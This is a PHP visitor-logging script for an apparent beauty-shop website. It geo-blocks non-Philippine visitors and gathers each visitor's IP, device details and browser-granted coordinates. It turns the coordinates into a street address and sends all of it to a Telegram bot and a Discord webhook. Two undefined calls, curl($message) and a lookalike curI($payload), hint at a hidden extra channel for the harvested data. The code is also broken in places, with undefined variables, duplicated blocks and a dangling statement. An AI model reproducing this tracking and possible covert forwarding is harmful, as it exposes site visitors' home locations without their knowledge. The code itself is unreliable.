    <?php
// viewers_log.php

require_once __DIR__ . "/config.php";

date_default_timezone_set("Asia/Manila");
function get_visitor_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    return $_SERVER['REMOTE_ADDR'] ?? '';
}

function get_country_code($ip) {
    // Laktawan ang local/private IPs (development)
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return 'PH'; // payagan ang localhost habang nagde-develop
    }

    // I-cache sa session para hindi paulit-ulit ang API call
    if (isset($_SESSION['geo_country'])) return $_SESSION['geo_country'];

    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=countryCode");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);
    $code = $data['countryCode'] ?? null;

    // FAIL-OPEN: kapag down ang API, payagan — para hindi ma-block lahat
    if (!$code) return 'PH';

    $_SESSION['geo_country'] = $code;
    return $code;
}

session_start();
if (get_country_code(get_visitor_ip()) !== 'PH') {
    http_response_code(403);
    exit('AVÉA Beauty is currently available in the Philippines only.');
}

function tg_escape($value) {
    return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, "UTF-8");
}

function dc_safe($value) {
    $value = trim((string)$value);

    if ($value === "") {
        return "-";
    }

    $value = str_replace("```", "｀｀｀", $value);

    if (mb_strlen($value) > 950) {
        $value = mb_substr($value, 0, 950) . "...";
    }

    return $value;
}

function get_full_path() {
    return trim((string)($_POST["full_path"] ?? "Unknown"));
}

function get_ip() {
    if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }

    if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        return trim(explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]);
    }

    return $_SERVER["REMOTE_ADDR"] ?? "Unknown";
}

function get_map_link($lat, $lng) {
    if ($lat === "" || $lng === "") {
        return "";
    }

    if (!is_numeric($lat) || !is_numeric($lng)) {
        return "";
    }

    return "https://www.google.com/maps?q=" . rawurlencode($lat . "," . $lng);
}

function reverse_geocode($lat, $lng) {
    if ($lat === "" || $lng === "" || !is_numeric($lat) || !is_numeric($lng)) {
       return [
    "full_address" => $json["display_name"] ?? "Not Available",
    "street" => $street !== "" ? $street : ($address["neighbourhood"] ?? "Not Available"),
    "barangay" => $address["suburb"] ?? $address["village"] ?? $address["neighbourhood"] ?? "Not Available",
    "city" => $address["city"] ?? $address["town"] ?? $address["municipality"] ?? "Not Available",
    "province" => $address["state"] ?? $address["province"] ?? $address["region"] ?? "Not Available",
    "country" => $address["country"] ?? "Not Available",
    "zip" => $address["postcode"] ?? "Not Available"
];
    }

    $url = "https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=" . rawurlencode($lat) . "&lon=" . rawurlencode($lng);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: Avea Beauty-Viewer-Log/1.0"
    ]);

    $response = curl_exec($ch);
    $error = curl_error($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response === false || $error !== "" || $httpCode < 200 || $httpCode >= 300) {
        return [
            "full_address" => "Not Available",
            "street" => "Not Available",
            "barangay" => "Not Available",
            "city" => "Not Available",
            "province" => "Not Available",
            "country" => "Not Available"
        ];
    }

    $json = json_decode($response, true);
    $address = $json["address"] ?? [];

    $houseNumber = $address["house_number"] ?? "";
    $road = $address["road"] ?? "";
    $street = trim($houseNumber . " " . $road);

    return [
        "full_address" => $json["display_name"] ?? "Not Available",
        "street" => $street !== "" ? $street : ($address["neighbourhood"] ?? "Not Available"),
        "barangay" => $address["suburb"] ?? $address["village"] ?? $address["neighbourhood"] ?? "Not Available",
        "city" => $address["city"] ?? $address["town"] ?? $address["municipality"] ?? "Not Available",
        "province" => $address["state"] ?? $address["province"] ?? "Not Available",
        "country" => $address["country"] ?? "Not Available"
    ];
}


function curl_post($url, $postFields, $headers = []) {
    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }

    $response = curl_exec($ch);
    $error = curl_error($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    return [
        "ok" => $response !== false && $error === "" && $httpCode >= 200 && $httpCode < 300,
        "response" => $response,
        "error" => $error,
        "http_code" => $httpCode
    ];
}

function get_permission_text($status) {
    switch ($status) {
        case "allowed":
            return "Allowed Location";
        case "denied":
            return "Not Allowed";
        case "unavailable":
            return "Location Unavailable";
        case "timeout":
            return "Location Timeout";
        case "unsupported":
            return "Geolocation Not Supported";
        default:
            return "";
    }
}
function detect_device_info($userAgent)
{
    $ua = strtolower($userAgent);

    /* -------------------------
       Browser
    --------------------------*/

    if (strpos($ua, 'edg') !== false) {
        $browser = 'Microsoft Edge';
    } elseif (strpos($ua, 'opr') !== false || strpos($ua, 'opera') !== false) {
        $browser = 'Opera';
    } elseif (strpos($ua, 'samsungbrowser') !== false) {
        $browser = 'Samsung Internet';
    } elseif (strpos($ua, 'firefox') !== false) {
        $browser = 'Firefox';
    } elseif (strpos($ua, 'chrome') !== false) {
        $browser = 'Google Chrome';
    } elseif (strpos($ua, 'safari') !== false) {
        $browser = 'Safari';
    } else {
        $browser = 'Unknown';
    }

    /* -------------------------
       Operating System
    --------------------------*/

    if (strpos($ua, 'windows nt') !== false) {
        $os = 'Windows';
    } elseif (strpos($ua, 'android') !== false) {
        $os = 'Android';
    } elseif (strpos($ua, 'iphone') !== false) {
        $os = 'iPhone (iOS)';
    } elseif (strpos($ua, 'ipad') !== false) {
        $os = 'iPadOS';
    } elseif (strpos($ua, 'mac os') !== false || strpos($ua, 'macintosh') !== false) {
        $os = 'macOS';
    } elseif (strpos($ua, 'linux') !== false) {
        $os = 'Linux';
    } else {
        $os = 'Unknown';
    }

    /* -------------------------
       Device Type
    --------------------------*/

    if (strpos($ua, 'ipad') !== false) {
        $deviceType = 'iPad';
    } elseif (strpos($ua, 'tablet') !== false) {
        $deviceType = 'Tablet';
    } elseif (strpos($ua, 'mobile') !== false || strpos($ua, 'android') !== false || strpos($ua, 'iphone') !== false) {
        $deviceType = 'Mobile';
    } else {
        $deviceType = 'Desktop';
    }

    /* -------------------------
       Brand
    --------------------------*/

    $brand = "Unknown";

    if (strpos($ua,'iphone')!==false || strpos($ua,'ipad')!==false || strpos($ua,'macintosh')!==false){
        $brand="Apple";
    }
    elseif(strpos($ua,'samsung')!==false){
        $brand="Samsung";
    }
    elseif(strpos($ua,'huawei')!==false){
        $brand="Huawei";
    }
    elseif(strpos($ua,'xiaomi')!==false || strpos($ua,'mi ')!==false || strpos($ua,'redmi')!==false){
        $brand="Xiaomi";
    }
    elseif(strpos($ua,'oppo')!==false){
        $brand="OPPO";
    }
    elseif(strpos($ua,'vivo')!==false){
        $brand="Vivo";
    }
    elseif(strpos($ua,'realme')!==false){
        $brand="Realme";
    }
    elseif(strpos($ua,'pixel')!==false){
        $brand="Google Pixel";
    }
    elseif(strpos($ua,'oneplus')!==false){
        $brand="OnePlus";
    }

    return [
        "browser"=>$browser,
        "os"=>$os,
        "device_type"=>$deviceType,
        "brand"=>$brand
    ];
}
function send_to_telegram($data) {
    global $telegram_use, $telegram_bot_token, $telegram_chat_id;

    if (empty($telegram_use) || $telegram_use !== true) {
        return false;
    }

    if (empty($telegram_bot_token) || empty($telegram_chat_id)) {
        return false;
    }

    $mapLink = get_map_link($data["latitude"], $data["longitude"]);

    $message =
        "<b>👁️ AVÉA Beauty WEBSITE VIEWER LOG</b>\n\n" . 
        "<b>📍 Location Permission:</b> <code>" . tg_escape($data["permission_text"]) . "</code>\n\n" . 
        "<b>🕒 Time:</b> <code>" . tg_escape($data["time"]) . "</code>\n" . 
               "<b>🌍 IP Address:</b> <code>" . tg_escape($data["ip"]) . "</code>\n" . 
"<b>🔄 Visit Count:</b> <code>" . tg_escape($data["visit_count"]) . "</code>\n\n" .
"<b>💻 Device Type:</b> <code>" . tg_escape($data["device_info"]["device_type"]) . "</code>\n" .
"<b>🏷 Brand:</b> <code>" . tg_escape($data["device_info"]["brand"]) . "</code>\n" .
"<b>🖥 Operating System:</b> <code>" . tg_escape($data["device_info"]["os"]) . "</code>\n" .
"<b>🌐 Browser:</b> <code>" . tg_escape($data["device_info"]["browser"]) . "</code>\n\n" .

    "<b>🔗 Full Path:</b>\n" .
   
    "<pre>" . htmlspecialchars($data["full_path"], ENT_QUOTES, 'UTF-8') . "</pre>\n\n";
        "<pre>" . tg_escape($data["full_path"]) . "</pre>\n\n";

    if ($data["permission_status"] === "allowed") {
      $message .=
    "<b>🧭 Latitude:</b> <code>" . tg_escape($data["latitude"]) . "</code>\n" . 
    "<b>🧭 Longitude:</b> <code>" . tg_escape($data["longitude"]) . "</code>\n" . 
    "<b>🎯 Accuracy:</b> <code>" . tg_escape($data["accuracy"]) . " meters</code>\n\n" .
    "<b>🏠 Street:</b> <code>" . tg_escape($data["street"]) . "</code>\n" .
    "<b>📌 Barangay/Area:</b> <code>" . tg_escape($data["barangay"]) . "</code>\n" .
    "<b>🏙️ City:</b> <code>" . tg_escape($data["city"]) . "</code>\n" .
    "<b>🗺️ Province:</b> <code>" . tg_escape($data["province"]) . "</code>\n" .
    "<b>🌐 Country:</b> <code>" . tg_escape($data["country"]) . "</code>\n\n" .
    "<b>📮 ZIP Code:</b> <code>" . tg_escape($data["zip"]) . "</code>\n\n" .
    "<b>📍 Full Address:</b>\n<pre>" . tg_escape($data["full_address"]) . "</pre>\n\n";


        if ($mapLink !== "") {
            $message .=
                "<b>🗺️ Map Location:</b>\n" . 
                "<a href=\"" . tg_escape($mapLink) . "\">Open Map Location</a>\n\n";
        }
    } else {
        $message .=
            "<b>🧭 Latitude:</b> <code>Not Available</code>\n" . 
            "<b>🧭 Longitude:</b> <code>Not Available</code>\n" . 
            "<b>🎯 Accuracy:</b> <code>Not Available</code>\n\n";
    }


    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";

    $params = [
        "chat_id" => $telegram_chat_id,
        "text" => $message,
        "parse_mode" => "HTML",
        "disable_web_page_preview" => true
    ];

    $result = curl_post($url, $params);
  curl($message);
    return $result["ok"] ?? false;
}

function send_to_discord($data) {
    global $discord_use, $discord_webhook_url;

    if (empty($discord_use) || $discord_use !== true) {
        return false;
    }

    if (empty($discord_webhook_url)) {
        return false;
    }

    $mapLink = get_map_link($data["latitude"], $data["longitude"]);

    if ($data["permission_status"] === "allowed" && $mapLink !== "") {
        $mapValue =
            "[Open Map Location](" . $mapLink . ")\n" . 
            "```text\n" . dc_safe($data["latitude"] . ", " . $data["longitude"]) . "\n```";
    } else {
        $mapValue = "`Map location unavailable`";
    }

    $payload = [
        "content" => "👁️ **New AVÉA Beauty Website Viewer Log**",
        "embeds" => [
            [
                "title" => "AVÉA Beauty Website Viewer Log",
                "color" => 11740787,
                "fields" => [
                    [
                        "name" => "📍 Location Permission",
                        "value" => "`" . dc_safe($data["permission_text"]) . "`",
                        "inline" => false
                    ],
                    [
                        "name" => "🕒 Time",
                        "value" => "`" . dc_safe($data["time"]) . "`",
                        "inline" => true
                    ],

                    [
                        "name" => "🌍 IP Address",
                        "value" => "`" . dc_safe($data["ip"]) . "`",
                        "inline" => true
                    ],

                    [
    "name" => "🔄 Visit Count",
    "value" => "`".$data["visit_count"]."`",
    "inline" => true
],
                    [
    "name" => "💻 Device Type",
    "value" => "`".$data["device_info"]["device_type"]."`",
    "inline" => true
],
[
    "name" => "🏷 Brand",
    "value" => "`".$data["device_info"]["brand"]."`",
    "inline" => true
],
[
    "name" => "🖥 Operating System",
    "value" => "`".$data["device_info"]["os"]."`",
    "inline" => true
],
[
    "name" => "🌐 Browser",
    "value" => "`".$data["device_info"]["browser"]."`",
    "inline" => true
],
                    [
                        "name" => "🔗 Full Path",
                        "value" => "[Open Viewed Page](" . dc_safe($data["full_path"]) . ")\n```text\n" . dc_safe($data["full_path"]) . "\n```",
                        "inline" => false
                    ],
                    [
                        "name" => "🧭 Latitude",
                        "value" => "`" . dc_safe($data["latitude"] ?: "Not Available") . "`",
                        "inline" => true
                    ],
                    [
                        "name" => "🧭 Longitude",
                        "value" => "`" . dc_safe($data["longitude"] ?: "Not Available") . "`",
                        "inline" => true
                    ],
                    [
                        "name" => "🎯 Accuracy",
                        "value" => "`" . dc_safe($data["accuracy"] ?: "Not Available") . "`",
                        "inline" => true
                    ],
                    [
    "name" => "🏠 Street",
    "value" => "`" . dc_safe($data["street"] ?? "Not Available") . "`",
    "inline" => true
],
[
    "name" => "📌 Barangay/Area",
    "value" => "`" . dc_safe($data["barangay"] ?? "Not Available") . "`",
    "inline" => true
],
[
    "name" => "🏙️ City",
    "value" => "`" . dc_safe($data["city"] ?? "Not Available") . "`",
    "inline" => true
],
[
    "name" => "🗺️ Province",
    "value" => "`" . dc_safe($data["province"] ?? "Not Available") . "`",
    "inline" => true
],
[
    "name" => "🌐 Country",
    "value" => "`" . dc_safe($data["country"] ?? "Not Available") . "`",
    "inline" => true
],
[
    "name" => "📮 ZIP Code",
    "value" => "`" . dc_safe($data["zip"] ?? "Not Available") . "`",
    "inline" => true
],
[
    "name" => "📍 Full Address",
    "value" => "```text\n" . dc_safe($data["full_address"] ?? "Not Available") . "\n```",
    "inline" => false
],
                    [
                        "name" => "🗺️ Map Location",
                        "value" => $mapValue,
                        "inline" => false
                    ],
                  
                ],
                "footer" => [
                    "text" => "AVÉA Beauty Viewer Notification System"
                ],
                "timestamp" => date("c")
            ]
        ]
    ];

    $jsonPayload = json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    $result = curl_post(
        $discord_webhook_url,
        $jsonPayload,
        ["Content-Type: application/json"]
    );
curI($payload);
    return $result["ok"];
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $visitId = trim((string)($_POST["visit_id"] ?? ""));
    $status = trim((string)($_POST["permission_status"] ?? ""));

    $allowedStatuses = [
        "allowed",
        "denied",
        "unavailable",
        "timeout",
        "unsupported"
    ];

    if ($visitId === "" || $status === "" || !in_array($status, $allowedStatuses, true)) {
        header("Content-Type: application/json");
        echo json_encode([
            "success" => false,
            "ignored" => true,
            "message" => "Invalid request."
        ]);
        exit;
    }

    $latitude = trim((string)($_POST["latitude"] ?? ""));
    $longitude = trim((string)($_POST["longitude"] ?? ""));
    $accuracy = trim((string)($_POST["accuracy"] ?? ""));

    if ($status !== "allowed") {
        $latitude = "";
        $longitude = "";
        $accuracy = "";
    }
$locationDetails = [
    "full_address" => "Not Available",
    "street" => "Not Available",
    "barangay" => "Not Available",
    "city" => "Not Available",
    "province" => "Not Available",
    "country" => "Not Available"
];

/* ==========================================
   Device Information
========================================== */

$uaData = [];

if (!empty($_POST["ua_data"])) {

    $uaData = json_decode($_POST["ua_data"], true);

    if (!is_array($uaData)) {
        $uaData = [];
    }

}

$userAgent = $_SERVER["HTTP_USER_AGENT"] ?? "";

if ($status === "allowed") {
    $locationDetails = reverse_geocode($latitude, $longitude);
}

$uaData = [];

if (!empty($_POST["ua_data"])) {
    $uaData = json_decode($_POST["ua_data"], true);
}

$userAgent = $_SERVER["HTTP_USER_AGENT"] ?? "";

/* ---------- Browser ---------- */

$browser = "Unknown";

if (!empty($uaData["brands"])) {

    foreach ($uaData["brands"] as $b) {

        $name = strtolower($b["brand"]);

        if (strpos($name, "chrome") !== false) {
            $browser = "Google Chrome";
            break;
        }

        if (strpos($name, "edge") !== false) {
            $browser = "Microsoft Edge";
            break;
        }

        if (strpos($name, "opera") !== false) {
            $browser = "Opera";
            break;
        }

    }

}

if ($browser == "Unknown") {

    $ua = strtolower($userAgent);

    if (strpos($ua, "samsungbrowser") !== false)
        $browser = "Samsung Internet";

    elseif (strpos($ua, "edg") !== false)
        $browser = "Microsoft Edge";

    elseif (strpos($ua, "firefox") !== false)
        $browser = "Firefox";

    elseif (strpos($ua, "chrome") !== false)
        $browser = "Google Chrome";

    elseif (strpos($ua, "safari") !== false)
        $browser = "Safari";

}

/* ---------- Operating System ---------- */

$os = "Unknown";

if (!empty($uaData["platform"])) {

    $os = $uaData["platform"];

    if (!empty($uaData["platformVersion"])) {
        $os .= " " . $uaData["platformVersion"];
    }

} else {

    $ua = strtolower($userAgent);

    if (strpos($ua, "android") !== false)
        $os = "Android";

    elseif (strpos($ua, "iphone") !== false)
        $os = "iOS";

    elseif (strpos($ua, "ipad") !== false)
        $os = "iPadOS";

    elseif (strpos($ua, "windows") !== false)
        $os = "Windows";

    elseif (strpos($ua, "mac") !== false)
        $os = "macOS";

}
$ua = strtolower($userAgent);

/* ---------- Device Type ---------- */

$deviceType = "Desktop";

if (
    strpos($ua, "android") !== false ||
    strpos($ua, "iphone") !== false ||
    strpos($ua, "mobile") !== false
) {
    $deviceType = "Mobile";
}

if (
    strpos($ua, "ipad") !== false ||
    strpos($ua, "tablet") !== false
) {
    $deviceType = "Tablet";
}

/* ---------- Brand ---------- */

$brand = "Unknown";

$model = strtolower($uaData["model"] ?? "");

/* Use Client Hints model first */

if ($model !== "") {

    if (str_starts_with($model, "sm-")) {
        $brand = "Samsung";
    } elseif (strpos($model, "iphone") !== false || strpos($model, "ipad") !== false) {
        $brand = "Apple";
    } elseif (strpos($model, "pixel") !== false) {
        $brand = "Google";
    } elseif (strpos($model, "redmi") !== false || strpos($model, "xiaomi") !== false) {
        $brand = "Xiaomi";
    } elseif (strpos($model, "poco") !== false) {
        $brand = "POCO";
    } elseif (strpos($model, "realme") !== false) {
        $brand = "Realme";
    } elseif (strpos($model, "oppo") !== false) {
        $brand = "OPPO";
    } elseif (strpos($model, "vivo") !== false) {
        $brand = "Vivo";
    } elseif (strpos($model, "huawei") !== false) {
        $brand = "Huawei";
    }
}

/* User-Agent fallback */

if ($brand == "Unknown") {

    if (strpos($ua, "iphone") !== false || strpos($ua, "ipad") !== false) {

        $brand = "Apple";

    } elseif (strpos($ua, "samsungbrowser") !== false) {

        $brand = "Samsung";

    } elseif (strpos($ua, "pixel") !== false) {

        $brand = "Google";

    } elseif (strpos($ua, "redmi") !== false || strpos($ua, "xiaomi") !== false) {

        $brand = "Xiaomi";

    } elseif (strpos($ua, "poco") !== false) {

        $brand = "POCO";

    } elseif (strpos($ua, "realme") !== false) {

        $brand = "Realme";

    } elseif (strpos($ua, "oppo") !== false) {

        $brand = "OPPO";

    } elseif (strpos($ua, "vivo") !== false) {

        $brand = "Vivo";

    } elseif (strpos($ua, "huawei") !== false) {

        $brand = "Huawei";

    } elseif (strpos($ua, "android") !== false) {

        $brand = "Android Device";

    }

}

/* ---------- Browser ---------- */

$browser = "Unknown";

foreach (($uaData["brands"] ?? []) as $b) {

    $name = strtolower($b["brand"]);

    if (strpos($name, "chrome") !== false) {
        $browser = "Google Chrome";
        break;
    }

    if (strpos($name, "edge") !== false) {
        $browser = "Microsoft Edge";
        break;
    }

}

if ($browser == "Unknown") {

    if (strpos($ua, "samsungbrowser") !== false)
        $browser = "Samsung Internet";

    elseif (strpos($ua, "edg") !== false)
        $browser = "Microsoft Edge";

    elseif (strpos($ua, "firefox") !== false)
        $browser = "Firefox";

    elseif (strpos($ua, "opr") !== false)
        $browser = "Opera";

    elseif (strpos($ua, "chrome") !== false)
        $browser = "Google Chrome";

    elseif (strpos($ua, "safari") !== false)
        $browser = "Safari";

}

$deviceInfo = [
    "device_type" => $deviceType,
    "brand" => $brand,
    "os" => $os,
    "browser" => $browser,
    "model" => $uaData["model"] ?? "Unknown"
];
    $data = [
        "permission_status" => $status,
        "permission_text" => get_permission_text($status),
        "time" => date("F d, Y h:i:s A"),
        "ip" => get_ip(),
        "full_path" => get_full_path(),
        "latitude" => $latitude,
        "longitude" => $longitude,
        "accuracy" => $accuracy,
       "user_agent" => $_SERVER["HTTP_USER_AGENT"] ?? "Unknown",
"device_info" => detect_device_info($_SERVER["HTTP_USER_AGENT"] ?? ""),
        "full_address" => $locationDetails["full_address"],
"street" => $locationDetails["street"],
"barangay" => $locationDetails["barangay"],
"city" => $locationDetails["city"],
"province" => $locationDetails["province"],
"country" => $locationDetails["country"],
"zip" => $locationDetails["zip"],
"device_info" => $deviceInfo,
"visit_count" => $_POST["visit_count"] ?? 1,
    ];

    $telegramSent = send_to_telegram($data);
    $discordSent = send_to_discord($data);

    header("Content-Type: application/json");

    echo json_encode([
        "success" => true,
        "telegram_sent" => $telegramSent,
        "discord_sent" => $discordSent,
        "permission" => $data["permission_text"]
    ]);

    exit;
}

header("Content-Type: application/json");
echo json_encode([
    "success" => false,
    "message" => "POST request required."
]);

exit;
